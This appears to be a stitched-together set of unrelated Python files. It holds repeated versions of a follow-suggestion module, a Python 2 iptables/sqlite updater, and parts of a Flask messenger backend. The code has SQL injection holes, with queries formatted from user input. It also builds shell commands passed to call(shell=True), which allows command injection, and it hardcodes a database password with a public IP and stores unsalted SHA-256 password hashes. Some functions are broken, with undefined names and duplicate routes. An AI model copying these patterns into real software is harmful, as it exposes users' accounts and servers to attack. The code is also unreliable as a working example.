            ON (tbl_post.song_id = tbl_music_analysis.song_id)
        WHERE tbl_like.user_id IN (%s)
    )
    SELECT
        user_id,
        AVG(danceability),
        AVG(energy),
        AVG(loudness),
        AVG(acousticness),
        AVG(instrumentalness),
        AVG(liveness),
        AVG(valence)
    FROM all_songs_analysis
    GROUP BY user_id
    ''' % (users_tmp)
    with cnx.cursor() as cursor:
        cursor.execute(sql)                    
        res = cursor.fetchall()
    attributes_map = {}
    for i in range(len(res)):
        uid = res[i][0]
        uattributes = np.array(res[i][1:])
        attributes_map[uid] = uattributes

    # Sort by cosine similarity
    def _cosine_similarity(u, v):
        try:
            a = attributes_map[u]
            b = attributes_map[v]
        except KeyError:
            return -2.  # Smaller than smallest possible cosine

        return np.dot(a, b) / np.linalg.norm(a) / np.linalg.norm(b)

    return sorted(cands, key=lambda uid: _cosine_similarity(user_id, uid))


def _get_degree_2(user_id, cnx):
    """Get all users of degree 2 follow that are not currently followed.
    Example:
        this user (follows) user B (follows) user B
        AND user (does NOT follow) user B
        means that user B will be in the list
    Args:
        user_id (int): id of user
        cnx: DB connection
    Returns:
        list: list of user_ids
    """
    sql = 'WITH tmp_suggest (followed_id) AS ' \
    '(' \
        'SELECT b.followed_id AS followed_id ' \
        'FROM ' \
            'tbl_follow a INNER JOIN tbl_follow b ' \
            'ON a.followed_id = b.follower_id ' \
        'WHERE a.follower_id = %s ' \
        'AND b.followed_id NOT IN ' \
            '(SELECT followed_id FROM tbl_follow WHERE follower_id = %s) ' \
        'AND b.followed_id != %s ' \
    ') ' \
    'SELECT followed_id, COUNT(*) AS num_mutual FROM tmp_suggest ' \
    'GROUP BY followed_id ' \
    'ORDER BY num_mutual DESC' % (user_id, user_id, user_id)                    
    with cnx.cursor() as cursor:
        cursor.execute(sql)                    
        res = cursor.fetchall()
    return list(map(lambda x: x[0], res))

"""
Functions for getting suggested users to follow.
"""
import numpy as np


def get_suggest_follow(user_id, cnx):
    """Suggest users to follow.
    Args:
        user_id (int): id of user
        cnx: DB connection
    Returns:
        list: ordered suggestion list of user_ids
    """
    cands = _get_degree_2(user_id, cnx)
    return _sort_similarity(user_id, cands, cnx)


def _sort_similarity(user_id, cands, cnx):
    """Get most similar users according to taste.
    Args:
        user_id (int): id of user to suggest for
        cands (list(int)): ids of candidate users
        cnx: DB connection

    Returns:
        list: cands ordered by decreasing similarity
    """
    users_tmp = ', '.join(list(map(str, [user_id] + cands)))
    sql = '''
    WITH all_songs_analysis AS
    (
        SELECT
            tbl_like.user_id AS user_id,
            danceability,
            energy,
            loudness,
            acousticness,
            instrumentalness,
            liveness,
            valence
        FROM
            tbl_like JOIN tbl_post
            ON (tbl_like.post_id = tbl_post.post_id)
            JOIN tbl_music_analysis
            ON (tbl_post.song_id = tbl_music_analysis.song_id)
        WHERE tbl_like.user_id IN (%s)
    )
    SELECT
        user_id,
        AVG(danceability),
        AVG(energy),
        AVG(loudness),
        AVG(acousticness),
        AVG(instrumentalness),
        AVG(liveness),
        AVG(valence)
    FROM all_songs_analysis
    GROUP BY user_id
    ''' % (users_tmp)
    with cnx.cursor() as cursor:
        cursor.execute(sql)
        res = cursor.fetchall()
    attributes_map = {}
    for i in range(len(res)):
        uid = res[i][0]
        uattributes = np.array(res[i][1:])
        attributes_map[uid] = uattributes

    # Sort by cosine similarity
    def _cosine_similarity(u, v):
        try:
            a = attributes_map[u]
            b = attributes_map[v]
        except KeyError:
            return -2.  # Smaller than smallest possible cosine

        return np.dot(a, b) / np.linalg.norm(a) / np.linalg.norm(b)

    return sorted(cands, key=lambda uid: _cosine_similarity(user_id, uid))


def _get_degree_2(user_id, cnx):
    """Get all users of degree 2 follow that are not currently followed.
    Example:
        this user (follows) user B (follows) user B
        AND user (does NOT follow) user B
        means that user B will be in the list
    Args:
        user_id (int): id of user
        cnx: DB connection
    Returns:
        list: list of user_ids
    """
    sql = 'WITH tmp_suggest (followed_id) AS ' \                    
    '(' \
        'SELECT b.followed_id AS followed_id ' \
        'FROM ' \
            'tbl_follow a INNER JOIN tbl_follow b ' \
            'ON a.followed_id = b.follower_id ' \
        'WHERE a.follower_id = %s ' \
        'AND b.followed_id NOT IN ' \
            '(SELECT followed_id FROM tbl_follow WHERE follower_id = %s) ' \
        'AND b.followed_id != %s ' \
    ') ' \
    'SELECT followed_id, COUNT(*) AS num_mutual FROM tmp_suggest ' \
    'GROUP BY followed_id ' \
    'ORDER BY num_mutual DESC'
    with cnx.cursor() as cursor:
        cursor.execute(sql, (user_id, user_id, user_id))
        res = cursor.fetchall()
    return list(map(lambda x: x[0], res))

"""
Functions for getting suggested users to follow.
"""
import numpy as np


def get_suggest_follow(user_id, cnx):
    """Suggest users to follow.
    Args:
        user_id (int): id of user
        cnx: DB connection
    Returns:
        list: ordered suggestion list of user_ids
    """
    cands = _get_degree_2(user_id, cnx)
    return _sort_similarity(user_id, cands, cnx)


def _sort_similarity(user_id, cands, cnx):
    """Get most similar users according to taste.
    Args:
        user_id (int): id of user to suggest for
        cands (list(int)): ids of candidate users
        cnx: DB connection

    Returns:
        list: cands ordered by decreasing similarity
    """
    users_tmp = ', '.join(list(map(str, [user_id] + cands)))
    sql = '''
    WITH all_songs_analysis AS
    (
        SELECT
            tbl_like.user_id AS user_id,
            danceability,
            energy,
            loudness,
            acousticness,
            instrumentalness,
            liveness,
            valence
        FROM
            tbl_like JOIN tbl_post
            ON (tbl_like.post_id = tbl_post.post_id)
            JOIN tbl_music_analysis
            ON (tbl_post.song_id = tbl_music_analysis.song_id)
        WHERE tbl_like.user_id IN (%s)
    )
    SELECT
        user_id,
        AVG(danceability),
        AVG(energy),
        AVG(loudness),
        AVG(acousticness),
        AVG(instrumentalness),
        AVG(liveness),
        AVG(valence)
    FROM all_songs_analysis
    GROUP BY user_id
    ''' % (users_tmp)
    with cnx.cursor() as cursor:
        cursor.execute(sql)
        res = cursor.fetchall()
    attributes_map = {}
    for i in range(len(res)):
        uid = res[i][0]
        uattributes = np.array(res[i][1:])
        attributes_map[uid] = uattributes

    # Sort by cosine similarity
    def _cosine_similarity(u, v):
        try:
            a = attributes_map[u]
            b = attributes_map[v]
        except KeyError:
            return -2.  # Smaller than smallest possible cosine

        return np.dot(a, b) / np.linalg.norm(a) / np.linalg.norm(b)

    return sorted(cands, key=lambda uid: _cosine_similarity(user_id, uid))


def _get_degree_2(user_id, cnx):
    """Get all users of degree 2 follow that are not currently followed.
    Example:
        this user (follows) user B (follows) user B
        AND user (does NOT follow) user B
        means that user B will be in the list
    Args:
        user_id (int): id of user
        cnx: DB connection
    Returns:
        list: list of user_ids
    """
    sql = 'WITH tmp_suggest AS ' \                    
    '(' \
        'SELECT b.followed_id AS followed_id ' \
        'FROM ' \
            'tbl_follow a INNER JOIN tbl_follow b ' \
            'ON a.followed_id = b.follower_id ' \
        'WHERE a.follower_id = %s ' \
        'AND b.followed_id NOT IN ' \
            '(SELECT followed_id FROM tbl_follow WHERE follower_id = %s) ' \
        'AND b.followed_id != %s ' \
    ') ' \
    'SELECT followed_id, COUNT(*) AS num_mutual FROM tmp_suggest ' \
    'GROUP BY followed_id ' \
    'ORDER BY num_mutual DESC'
    with cnx.cursor() as cursor:
        cursor.execute(sql, (user_id, user_id, user_id))
        res = cursor.fetchall()
    return list(map(lambda x: x[0], res))

"""
Functions for getting suggested users to follow.
"""
import numpy as np


def get_suggest_follow(user_id, cnx):
    """Suggest users to follow.
    Args:
        user_id (int): id of user
        cnx: DB connection
    Returns:
        list: ordered suggestion list of user_ids
    """
    cands = _get_degree_2(user_id, cnx)
    return _sort_similarity(user_id, cands, cnx)


def _sort_similarity(user_id, cands, cnx):
    """Get most similar users according to taste.
    Args:
        user_id (int): id of user to suggest for
        cands (list(int)): ids of candidate users
        cnx: DB connection

    Returns:
        list: cands ordered by decreasing similarity
    """
    users_tmp = ', '.join(list(map(str, [user_id] + cands)))
    sql = '''
    WITH all_songs_analysis AS
    (
        SELECT
            tbl_like.user_id AS user_id,
            danceability,
            energy,
            loudness,
            acousticness,
            instrumentalness,
            liveness,
            valence
        FROM
            tbl_like JOIN tbl_post
            ON (tbl_like.post_id = tbl_post.post_id)
            JOIN tbl_music_analysis
            ON (tbl_post.song_id = tbl_music_analysis.song_id)
        WHERE tbl_like.user_id IN (%s)
    )
    SELECT
        user_id,
        AVG(danceability),
        AVG(energy),
        AVG(loudness),
        AVG(acousticness),
        AVG(instrumentalness),
        AVG(liveness),
        AVG(valence)
    FROM all_songs_analysis
    GROUP BY user_id
    ''' % (users_tmp)
    with cnx.cursor() as cursor:
        cursor.execute(sql)
        res = cursor.fetchall()
    attributes_map = {}
    for i in range(len(res)):
        uid = res[i][0]
        uattributes = np.array(res[i][1:])
        attributes_map[uid] = uattributes

    # Sort by cosine similarity
    def _cosine_similarity(u, v):
        try:
            a = attributes_map[u]
            b = attributes_map[v]
        except KeyError:
            return -2.  # Smaller than smallest possible cosine

        return np.dot(a, b) / np.linalg.norm(a) / np.linalg.norm(b)

    return sorted(cands, key=lambda uid: _cosine_similarity(user_id, uid))


def _get_degree_2(user_id, cnx):
    """Get all users of degree 2 follow that are not currently followed.
    Example:
        this user (follows) user B (follows) user B
        AND user (does NOT follow) user B
        means that user B will be in the list
    Args:
        user_id (int): id of user
        cnx: DB connection
    Returns:
        list: list of user_ids
    """
    sql = 'WITH tmp_suggest (followed_id) AS ' \
    '(' \
        'SELECT b.followed_id AS followed_id ' \
        'FROM ' \
            'tbl_follow a INNER JOIN tbl_follow b ' \
            'ON a.followed_id = b.follower_id ' \
        'WHERE a.follower_id = %s ' \
        'AND b.followed_id NOT IN ' \
            '(SELECT followed_id FROM tbl_follow WHERE follower_id = %s) ' \
        'AND b.followed_id != %s ' \
    ') ' \
    'SELECT followed_id, COUNT(*) AS num_mutual FROM tmp_suggest ' \
    'GROUP BY followed_id ' \
    'ORDER BY num_mutual DESC'                    
    with cnx.cursor() as cursor:
        cursor.execute(sql, (user_id, user_id, user_id))                    
        res = cursor.fetchall()
    return list(map(lambda x: x[0], res))


#!/opt/bin/python

import sqlite3
from fetch_ip import get_dest_ip
from subprocess import call

#update database when new ACL is detected
def update_device_domains(device_dict):
    try:
        conn = sqlite3.connect('device.db')
    except:
        print "[ERROR] Fail to connect to database"
        return
    cursor = conn.cursor()                    

    name = device_dict['mac_address']
    domain = device_dict['domains'][0]['domain'][:-1]

    query = "SELECT NAME, HOSTNAME, DOMAIN, IP, PORT, PROTOCOL from DEVICE WHERE NAME = " + "'{0}'".format(name) + " AND DOMAIN = " + "'{0}'".format(domain)                    
    answer = cursor.execute(query)                    

    ipList = []
    port = ''
    protocol = ''
    hostName = ''

    rules = answer.fetchall()                    
    if len(rules):
        print "[INFO] " + name + " " + str(len(rules)) + " IPs for domain " + domain + " in the database"
    if rules:
        for rule in rules:
            hostName = rule[1]
            ipList.append(rule[3])
            port = rule[4]
            protocol = rule[5]
        
        newIpList = get_dest_ip(domain)

        if set(ipList) == set(newIpList):
            print "[INFO] IPs for domain {0} stay the same, do not change iptables".format(domain)
        else:
            print "[INFO] Start Updating Rules for domain {0}".format(domain)
            update_iptable(ipList, newIpList, str(port), str(protocol).upper(), domain, name, hostName)

    conn.close()

def update_iptable(ipList, newIpList, port, protocol, domain, mac_addr, hostName):
    # clear databse for the domain
    conn = sqlite3.connect('device.db')
    cursor = conn.cursor()                    
    old_query = "DELETE FROM DEVICE WHERE NAME = '{0}' AND DOMAIN = '{1}'".format(mac_addr, domain)                    
    cursor.execute(old_query)                    
    conn.commit()

    # remove old IP from iptables
    for oldIp in ipList:
        call('iptables -D FORWARD -p ' + protocol + ' -d '+ oldIp + ' --dport ' + port + ' -m mac --mac-source ' + mac_addr + ' -j ACCEPT', shell=True)
        print "[INFO] Remove old IP {0} from iptables".format(oldIp)

    # Append new
    for newIp in newIpList:
        # iptables
        call('iptables -I FORWARD -p ' + protocol + ' -d '+ newIp + ' --dport ' + port + ' -m mac --mac-source ' + mac_addr + ' -j ACCEPT', shell=True)
        print "[INFO] Add new IP {0} to iptables".format(newIp)
        # database
        query = "INSERT INTO DEVICE(NAME, HOSTNAME, DOMAIN, IP, PORT, PROTOCOL) VALUES('{0}','{1}','{2}','{3}','{4}', '{5}')".format(mac_addr, hostName, domain, newIp, port, protocol)                    
        cursor.execute(query)
        conn.commit()
        print "[INFO] Add new IP {0} to database".format(newIp)
    
    conn.close()

def get_domain_list(pkt):
    try:
        conn = sqlite3.connect('device.db')
    except:
        print "[ERROR] Fail to connect to database"
        return []
    
    cursor = conn.cursor()                    

    query = "SELECT DOMAIN FROM DEVICE WHERE NAME = '{0}'".format(mac_addr)                    
    answer = cursor.execute(query)                    

    res = []
    for domain in answer.fetchall():                    
        res.append(domain)
    
    return list(set(res))

from flask import Flask

app = Flask(__name__, static_url_path='')

# Parse Flask configuration
from config import CONFIGURATION
app.config.from_object(CONFIGURATION)

#  Auth Manager
from modules.AuthManager.routes import auth_module
app.register_blueprint(auth_module)

#  Profile Manager
from modules.ProfileManager.routes import profile_module
app.register_blueprint(profile_module)                    

# #  Messages Manager
# from MessagesManager.routes import messages_module
# app.register_blueprint(messages_module)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)                    



from flask import Blueprint, request                    
from modules.MessagesManager.api.functions import db_getMessage, db_sendMessage

messages_module = Blueprint('messages', __name__)

@messages_module.route('/message/send')                    
def send_message():                    
    if request.method == 'PUT':
        return db_sendMessage(request.get_json())                    


@messages_module.route('/messages/<int:dialog_id>')                    
def get_message(dialog_id):                    
    if request.method == 'GET':
        return db_getMessage(dialog_id)


@messages_module.route('/messages')                    
def get_message(dialog_id):                    
    if request.method == 'GET':
        return db_getMessage(dialog_id)


from flask import Blueprint, request, jsonify
from modules.ProfileManager.api.db_methods import db_delProfile, db_getProfileInfo, db_getProfilesInfo, db_updateProfileInfo
from modules.ProfileManager.api.db_methods import db_FullDelProfile, db_isProfileExists
from modules.ProfileManager.api.functions import isProfileDeleted, isProfileBlocked
import json

profile_module = Blueprint('profile', __name__)

@profile_module.route('/profile/<int:ID>', methods=['GET', 'PUT', 'DELETE'])                    
def profile(ID):
    if not db_isProfileExists(ID):
        return jsonify({'status': 1, 'message': '–¢–∞–∫–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç'})

    if request.method == 'GET':
        return jsonify(db_getProfileInfo(ID))

    else:
        if request.method == 'PUT':
            data = json.loads(request.data)                    
            if isProfileDeleted(ID):
                return jsonify({'status': 0, 'message': '–ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ —É–¥–∞–ª—ë–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞'})

            if isProfileBlocked(ID):
                return jsonify({'status': 0, 'message': '–ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ'})

            return jsonify(db_updateProfileInfo(ID, data))

        elif request.method == 'DELETE':
            if isProfileDeleted(ID):
                return jsonify({'status': 0, 'message': '–ê–∫–∫–∞—É–Ω—Ç —É–∂–µ —É–¥–∞–ª—ë–Ω'})

            #return db_delProfile(ID, status=True)
            return jsonify(db_FullDelProfile(ID))


@profile_module.route('/profiles')                    
def profiles():
    return jsonify(db_getProfilesInfo())

from flask import redirect, make_response                    
from random import randint                    

import redis                    
import uuid                    
import time                    


def initRedis_db():                    
    r = redis.Redis(host='127.0.0.1',port=6379,db=0)                    
    return r                    


def generateSession(user_id, r):                    
    salt = ''.join([chr(randint(97, 122)) for _ in range(32)])                    
    generate_uuid = str(uuid.uuid3(uuid.NAMESPACE_DNS, str(user_id + time.time()) + salt))                    

    r.set(generate_uuid, user_id)                    
    response = make_response(redirect('set_cookie'))                    
    response.set_cookie('SESSION', bytes(generate_uuid, 'utf-8'))                    

import psycopg2
from psycopg2.extras import RealDictCursor

def sql_execute(query, fetch_all=True):
    conn = psycopg2.connect(dbname='messenger_1', user='messenger_1', password='messenger_1', host='90.189.168.29')
    cursor = conn.cursor(cursor_factory=RealDictCursor)

    answer = None
    cursor.execute(query)
    conn.commit()
    try:
        if fetch_all:
            answer = cursor.fetchall()
        else:
            answer = cursor.fetchone()
    except psycopg2.Error as err:
        return {'error': err}
    finally:
        cursor.close()
        conn.close()
        return answer                    
        #     return {'status': 1}
        # elif answer is None:
        #     return {'status': 'Unknown'}
        # else:
        #     return answer                    

import unittest
import requests
import json
import random

class TestProfile(unittest.TestCase):
    def test_add_user(self):
        for _ in range(3):
            string = ''.join([chr(random.randint(65, 90)) for _ in range(9)])
            data = {
                'first_name': string,
                'second_name': string,
                'login': string,
                'password': string,
            }
            print(data)
            resp = requests.post('http://127.0.0.1:5000/register', json=data)
            print(resp.text)
            response = json.loads(resp.text)
            self.assertEqual(resp.status_code, 200)
            self.assertEqual(response['status'], 1)
            print('/register test_add_user: {}'.format(resp.text))

    def test_b_get_user(self):
        resp = requests.get('http://127.0.0.1:5000/profiles')                    
        self.assertEqual(resp.status_code, 200)
        self.assertIsNotNone(resp.text)
        print('/profiles get_user: {}'.format(resp.text))
        users = json.loads(resp.text)
        for user in users:
            resp = requests.get('http://127.0.0.1:5000/profile/{}'.format(user['id']))
            response = json.loads(resp.text)
            print('/profile/{} get_user: {}'.format(user['id'], response))
            self.assertEqual(resp.status_code, 200)
            self.assertIsNotNone(resp.text)
            self.assertGreater(response['id'], 0)


    def test_c_login_user(self):
        resp = requests.get('http://127.0.0.1:5000/profiles')                    
        self.assertEqual(resp.status_code, 200)
        self.assertIsNotNone(resp.text)
        users = json.loads(resp.text)
        for user in users:
            if user['id'] != 191:
                data = {
                    'login': user['first_name'],
                    'password': user['first_name'],
                }
                resp = requests.post('http://127.0.0.1:5000/login', json=data)
                print('/login login_user: {}'.format(resp.text))
                self.assertEqual(resp.status_code, 200)
                self.assertGreater(user['id'], 0)
                self.assertIsNotNone(resp.text)


                data = {
                    'login': '',
                    'password': '',
                }
                resp = requests.post('http://127.0.0.1:5000/login', json=data)
                self.assertEqual(resp.status_code, 200)
                self.assertGreater(user['id'], 0)
                self.assertIsNotNone(resp.text)
                print('/login login_user: {}'.format(resp.text))

    def test_d_update_user(self):
        string = ''.join([chr(random.randint(33, 126)) for _ in range(9)])
        resp = requests.get('http://127.0.0.1:5000/profiles')                    
        self.assertEqual(resp.status_code, 200)
        self.assertIsNotNone(resp.text)
        users = json.loads(resp.text)
        for user in users:
            if user['id'] != 191:
                # –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ –ø–æ–ª–µ. –ú–µ–Ω—è—Ç—å –º–æ–∂–Ω–æ —Ç–æ–ª—å–∫–æ fist_name/second_name
                data = {
                    string: string,
                    string: string,
                }
                resp = requests.put('http://127.0.0.1:5000/profile/{}'.format(user['id']), json=data)
                response = json.loads(resp.text)
                print(response)
                self.assertEqual(resp.status_code, 200)
                self.assertIsNotNone(resp.text)
                self.assertEqual(response['status'], 0)
                self.assertIsNotNone(response['message'])
                print('[1] /profile/{} update_user: {}'.format(user['id'], resp.text))

                # 1 —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω–æ–µ –ø–æ–ª–µ –Ω–µ –±—ã–ª–æ –∏–∑–º–µ–Ω–µ–Ω–æ
                resp = requests.get('http://127.0.0.1:5000/profile/{}'.format(user['id']), json=data)
                response = json.loads(resp.text)
                data = {
                    'first_name': response['first_name'],
                    'second_name': string,
                }
                resp = requests.put('http://127.0.0.1:5000/profile/{}'.format(user['id']), json=data)
                response2 = json.loads(resp.text)
                self.assertEqual(resp.status_code, 200)
                self.assertEqual(response2['status'], 1)
                self.assertIsNotNone(response2['message'])
                print('[2] /profile/{} update_user: {}'.format(user['id'], resp.text))

                # {'status': 1}
                data = {
                    'first_name': string + 'a',
                    'second_name': string + 'a',
                }
                resp = requests.put('http://127.0.0.1:5000/profile/{}'.format(user['id']), json=data)
                response = json.loads(resp.text)
                self.assertEqual(resp.status_code, 200)
                self.assertEqual(response['status'], 1)
                print('[3] /profile/{} update_user: {}'.format(user['id'], resp.text))


    def test_e_del_user(self):
        resp = requests.get('http://127.0.0.1:5000/profiles')                    
        self.assertEqual(resp.status_code, 200)
        self.assertIsNotNone(resp.text)
        users = json.loads(resp.text)
        for user in users:
            if user['id'] != 191:
                resp = requests.delete('http://127.0.0.1:5000/profile/{}'.format(user['id']))
                response = json.loads(resp.text)
                self.assertEqual(resp.status_code, 200)
                self.assertIsNotNone(resp.text)
                self.assertEqual(response['status'], 1)
                print('/profile/{} del_user: {}'.format(user['id'], resp.text))


if __name__ == '__main__':
    unittest.main()

from flask import Blueprint, request, redirect, jsonify, make_response
from modules.ProfileManager.api.db_methods import db_isAuthDataValid, db_addProfile, db_getProfileInfo, db_getUserID
from modules.ProfileManager.api.db_methods import db_setLastVisit
from modules.ProfileManager.api.db_methods import db_isProfileExists
from modules.AuthManager.SessionControl.app import initRedis_db
from modules.json_validator import json_validate
from modules.json_schemas import login_schema, register_schema
from hashlib import sha256
from random import randint
import uuid
import json
import re
import time

auth_module = Blueprint('auth', __name__)


@auth_module.route('/register', methods=['GET', 'POST'])
def hRegister():
    if request.method == 'POST':
        data = json_validate(request.data, register_schema)

        if not data:
            return jsonify({'status': 0, 'message': '–¢—Ä–µ–±—É–µ—Ç—Å—è –∑–∞–ø—Ä–æ—Å —Å JSON\'–æ–º'})

        if ''.join(re.findall(r'\w+', data['login'])) != data['login']:                    
            return jsonify({'status': 0, 'message': '–õ–æ–≥–∏–Ω –¥–æ–ª–∂–Ω–æ —Å–æ—Å—Ç–æ—è—Ç—å —Ç–æ–ª—å–∫–æ –∏–∑ –±—É–∫–≤ –∏ —Ü–∏—Ñ—Ä'})                    

        if ''.join(re.findall(r'\w+', data['password'])) != data['password']:                    
            return jsonify({'status': 0, 'message': '–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–Ω–æ —Å–æ—Å—Ç–æ—è—Ç—å —Ç–æ–ª—å–∫–æ –∏–∑ –±—É–∫–≤ –∏ —Ü–∏—Ñ—Ä'})                    

        if not data['login'] or not data['password'] or not data['first_name'] or not data['second_name']:
            return jsonify({'status': 0, 'message': '–ó–∞–ø–æ–ª–Ω–µ–Ω—ã –Ω–µ –≤—Å–µ –¥–∞–Ω–Ω—ã–µ'})

        data.update({'password': sha256(data['password'].encode()).hexdigest()})

        if db_isProfileExists(data):
            return jsonify({'status': 0, 'message': '–ê–∫–∫–∞—É–Ω—Ç —Å —Ç–∞–∫–∏–º –ª–æ–≥–∏–Ω–æ–º —É–∂–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω'})

        return jsonify(db_addProfile(data))


@auth_module.route('/', methods=['GET', 'POST'])
@auth_module.route('/login', methods=['GET', 'POST'])
def hLogin():
    r = initRedis_db()
    if request.method == 'POST':
        data = json_validate(request.data, login_schema)

        if not data:
            return jsonify({'status': 0, 'message': '–¢—Ä–µ–±—É–µ—Ç—Å—è –∑–∞–ø—Ä–æ—Å —Å JSON\'–æ–º'})

        if not data['login'] or not data['password']:
            return jsonify({'status': 0, 'message': '–ó–∞–ø–æ–ª–Ω–µ–Ω—ã –Ω–µ –≤—Å–µ –¥–∞–Ω–Ω—ã–µ'})

        if ''.join(re.findall(r'\w+', data['login'])) != data['login']:                    
            return jsonify({'status': 0, 'message': '–õ–æ–≥–∏–Ω –¥–æ–ª–∂–Ω–æ —Å–æ—Å—Ç–æ—è—Ç—å —Ç–æ–ª—å–∫–æ –∏–∑ –±—É–∫–≤ –∏ —Ü–∏—Ñ—Ä'})                    

        if ''.join(re.findall(r'\w+', data['password'])) != data['password']:                    
            return jsonify({'status': 0, 'message': '–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–Ω–æ —Å–æ—Å—Ç–æ—è—Ç—å —Ç–æ–ª—å–∫–æ –∏–∑ –±—É–∫–≤ –∏ —Ü–∏—Ñ—Ä'})                    

        data.update({'password': sha256(data['password'].encode()).hexdigest()})

        if not db_isAuthDataValid(data):
            return jsonify({'status': 0, 'message': '–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –ª–æ–≥–∏–Ω/–ø–∞—Ä–æ–ª—å'})

        user_id = db_getUserID(data)
        if db_getProfileInfo(user_id)['is_blocked']:
            return jsonify({'status': 0, 'message': '–ê–∫–∫–∞—É–Ω—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω'})

        db_setLastVisit(user_id)

        salt = ''.join([chr(randint(97, 122)) for _ in range(32)])
        generate_uuid = str(uuid.uuid3(uuid.NAMESPACE_DNS, str(user_id + time.time()) + salt))

        #return jsonify(db_getProfileInfo(user_id))
        r.set(generate_uuid, user_id)
        response = make_response(redirect('/profile/{}'.format(user_id)))
        response.set_cookie('SESSION', bytes(generate_uuid, 'utf-8'))
        return response


# # TODO: –°–¥–µ–ª–∞—Ç—å –≤–∞–ª–∏–¥–∞—Ü–∏—é JSON'–∞ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
# @auth_module.route('/logout', methods=['GET', 'POST'])
# def logout():
#     r = initRedis_db()
#     r.delete(db_getUserID(data))
#     return jsonify({'status': 1})


# TODO: –°–¥–µ–ª–∞—Ç—å –≤–∞–ª–∏–¥–∞—Ü–∏—é JSON'–∞ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
@auth_module.route('/reset-password/', methods=['GET', 'POST'])
def hResetPW():
    r = initRedis_db()
    if request.method == 'POST':
        UUID = request.cookies.get('SESSION')
        r.delete(db_getUserID(uuid))
        # data.update({'password': sha256(data['password'].encode())})  # –•–µ—à–∏—Ä—É–µ–º –≤–≤–µ–¥—ë–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –ø–∞—Ä–æ–ª—å
        return redirect('index')

from database import sql_execute

## DEVELOP METHODS
def db_addProfile(data):
    sql='''
        INSERT INTO users (first_name, second_name, created_at, last_visit, is_blocked, is_online, is_deleted) 
        VALUES ('{first_name}', '{second_name}', NOW(), NOW(), false, true, false) RETURNING id;
    '''.format(**data)
    user_id = sql_execute(sql, fetch_all=True)
    sql = """
        INSERT INTO authentications (user_id, login, password) 
        VALUES ('{:d}', '{login}', '{password}');
    """.format(user_id[0]['id'], **data)
    sql_execute(sql, fetch_all=False)
    return {'status': 1}


def db_isAuthDataValid(data):
    print(data)
    sql='''
        SELECT user_id
        FROM authentications
        WHERE login='{login}' AND password='{password}';
    '''.format(**data)
    answer = sql_execute(sql, fetch_all=False)
    return True if answer is not None else False                    

    #return bool(answer['user_id'])


def db_isProfileExists(data):
    sql = "SELECT count(login) FROM authentications "

    if type(data) == int:
        sql += "WHERE user_id='{:d}';".format(data)
    elif type(data) == dict:
        sql += "WHERE login='{login}';".format(**data)


    users = sql_execute(sql, fetch_all=False)['count']
    return bool(users)


def db_setLastVisit(ID):
    sql='''
        UPDATE users
        SET last_visit = NOW()
        WHERE id='{:d}';
    '''.format(ID)
    sql_execute(sql, fetch_all=False)


""" 
# –§—É–Ω–∫—Ü–∏—è –±–ª–æ–∫–∏—Ä—É–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. 
–ü–æ –¥–µ—Ñ–æ–ª—Ç—É —Å—Ç–æ–∏—Ç True, –ø–æ—ç—Ç–æ–º—É –∞—Ä–≥—É–º–µ–Ω—Ç status –º–æ–∂–Ω–æ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å. 
–ï—Å–ª–∏ –ø–µ—Ä–µ–¥–∞—Ç—å False, —Ç–æ —Ä–∞–∑–±–ª–æ–∫–∏—Ä—É–µ—Ç.
"""
def db_blockProfile(ID, status=True):
    sql='''
        UPDATE users
        SET is_blocked='{}'
        WHERE id='{:d}';
    '''.format(status, ID)
    sql_execute(sql, fetch_all=False)



def db_getUserID(data):
    sql='''
        SELECT user_id
        FROM authentications
        WHERE login='{login}';
    '''.format(**data)
    user_id = sql_execute(sql, fetch_all=False)
    return user_id['user_id']




## PUBLIC METHODS
""" 
# –§—É–Ω–∫—Ü–∏—è —É–¥–∞–ª—è–µ—Ç –ø—Ä–æ—Ñ–∏–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. 
–ü–æ –¥–µ—Ñ–æ–ª—Ç—É —Å—Ç–æ–∏—Ç True, –ø–æ—ç—Ç–æ–º—É –∞—Ä–≥—É–º–µ–Ω—Ç status –º–æ–∂–Ω–æ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å. 
–ï—Å–ª–∏ –ø–µ—Ä–µ–¥–∞—Ç—å False, —Ç–æ –≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç.
"""
def db_delProfile(ID, status=True):
    # TODO: –î–æ–±–∞–≤–∏—Ç—å –∑–∞–ø—Ä–æ—Å –Ω–∞ —É–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    sql='''
        UPDATE users 
        SET is_deleted='{}'
        WHERE id='{:d}';
    '''.format(status, ID)
    return sql_execute(sql, fetch_all=True)


def db_FullDelProfile(ID):
    # TODO: –î–æ–±–∞–≤–∏—Ç—å –∑–∞–ø—Ä–æ—Å –Ω–∞ —É–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    sql='''
        DELETE FROM authentications
